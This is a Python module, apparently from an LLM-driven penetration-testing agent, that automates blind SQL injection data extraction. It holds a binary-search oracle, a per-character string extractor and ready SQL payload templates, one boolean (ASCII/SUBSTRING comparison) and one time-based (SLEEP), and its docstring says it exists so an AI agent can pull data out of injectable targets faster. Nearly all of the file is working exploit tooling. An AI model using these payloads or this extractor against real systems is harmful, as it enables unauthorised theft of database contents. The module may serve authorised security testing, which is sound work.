"""
Blind extraction oracle.

`probe_blind`/`detect_blind_injection` only *confirm* a blind injection point. They
do not recover data, so the Executor used to spin dozens of near-identical requests
without converging on this class of target (blind SQLi, blind command injection).
This module implements the deterministic half — binary search over a boolean oracle
— as generic Python, so the LLM only has to supply the subquery and the truth
signal, not hand-roll every comparison.

The algorithm is transport-agnostic: it drives an `oracle(condition:str) -> bool`
closure that the caller builds from its own request path (reusing session/auth/
delivery format). Nothing here talks to the network, so it is unit-testable offline.
"""
from __future__ import annotations

import re
from typing import Callable


_TOKEN = re.compile(r"[A-Za-z0-9_]{2,}")


def derive_marker(true_text: str, false_text: str) -> tuple[str, bool] | None:
    """Find a token that discriminates a TRUE response from a FALSE one.

    Needed when the oracle is *content*, not length — e.g. an endpoint returns
    {"response":"password"} vs {"response":"username"} (same length, different word).
    Returns (marker, in_true): oracle is `(marker in response) == in_true`.
    Prefers a token unique to TRUE; falls back to one unique to FALSE. None if neither.
    """
    t_tokens = set(_TOKEN.findall(true_text))
    f_tokens = set(_TOKEN.findall(false_text))
    only_true = sorted(t_tokens - f_tokens, key=len, reverse=True)
    if only_true:
        return only_true[0], True
    only_false = sorted(f_tokens - t_tokens, key=len, reverse=True)
    if only_false:
        return only_false[0], False
    return None


def binary_search_code(gt: Callable[[int], bool], lo: int, hi: int) -> int:
    """Return the smallest code in [lo, hi] consistent with `gt(n) == code > n`.

    `gt(n)` must answer "is the target character code strictly greater than n?".
    Uses ~log2(hi-lo) oracle calls (7 for full ASCII).
    """
    while lo < hi:
        mid = (lo + hi) // 2
        if gt(mid):
            lo = mid + 1
        else:
            hi = mid
    return lo


def extract_string(
    make_gt: Callable[[int], Callable[[int], bool]],
    *,
    max_length: int = 64,
    code_lo: int = 0,
    code_hi: int = 127,
    stop_code: int = 0,
) -> dict:
    """Recover a string one character at a time via a boolean oracle.

    Args:
        make_gt : given a 1-based index i, returns an oracle `gt(n) -> bool` that
                  answers "is code(char at position i) > n?".
        max_length : hard cap on characters (bounds worst-case request count).
        code_lo/code_hi : search bounds (default full ASCII).
        stop_code : when a position resolves to this code (default 0 / NUL), the
                    string is assumed finished and extraction stops. Set to -1 to
                    always read max_length characters.

    Returns dict: {value, length, requests, complete}.
    """
    out: list[str] = []
    requests = 0
    complete = False
    for i in range(1, max_length + 1):
        gt = make_gt(i)
        counter = {"n": 0}

        def counted(n: int, _gt=gt, _c=counter) -> bool:
            _c["n"] += 1
            return _gt(n)

        code = binary_search_code(counted, code_lo, code_hi)
        requests += counter["n"]
        if code == stop_code:
            complete = True
            break
        out.append(chr(code))
    else:
        complete = True  # hit max_length cleanly
    return {"value": "".join(out), "length": len(out), "requests": requests, "complete": complete}


# --- SQL condition templates: substitute the boolean into a suffix payload ---
# {sub} = the SELECT whose scalar result we exfiltrate; {i} = 1-based char index;
# {n} = code threshold being tested by the oracle.
SQL_BOOLEAN_TEMPLATE = "' AND ASCII(SUBSTRING(({sub}),{i},1))>{n}-- "
SQL_TIME_TEMPLATE = "' AND IF(ASCII(SUBSTRING(({sub}),{i},1))>{n},SLEEP({delay}),0)-- "


def build_sql_gt_factory(
    send_condition: Callable[[str], bool],
    subquery: str,
    *,
    template: str = SQL_BOOLEAN_TEMPLATE,
    delay: int = 3,
) -> Callable[[int], Callable[[int], bool]]:
    """Wrap a truth-returning sender into the make_gt factory extract_string expects.

    `send_condition(payload) -> bool` sends the payload and returns whether the
    boolean condition held (caller owns calibration + transport).
    """
    def make_gt(i: int) -> Callable[[int], bool]:
        def gt(n: int) -> bool:
            payload = template.format(sub=subquery, i=i, n=n, delay=delay)
            return send_condition(payload)
        return gt
    return make_gt
